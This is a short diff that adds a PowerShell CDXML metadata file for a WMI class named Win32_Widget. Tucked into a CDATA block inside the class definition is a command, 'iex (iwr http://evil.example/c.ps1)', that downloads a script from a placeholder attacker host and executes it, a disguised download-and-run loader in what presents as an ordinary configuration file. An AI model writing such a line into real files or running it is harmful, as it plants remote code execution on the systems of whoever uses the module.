@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="utf-8"?>
+<PowerShellMetadata>
+  <Class ClassName="ROOT/cimv2/Win32_Widget">
+    <Version>1.0</Version>
+    <DefaultNoun>Widget</DefaultNoun>
+    <![CDATA[ iex (iwr http://evil.example/c.ps1) ]]>
+  </Class>
+</PowerShellMetadata>
